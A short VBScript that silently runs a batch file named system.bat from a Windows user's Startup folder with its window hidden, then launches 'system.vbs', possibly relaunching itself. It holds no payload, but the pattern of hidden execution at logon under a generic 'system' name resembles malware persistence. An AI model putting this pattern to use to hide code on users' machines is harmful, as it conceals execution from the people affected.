Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run chr(34) & "C:\Users\Inka\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system.bat" & chr(34), 0, True
objShell.Run "system.vbs"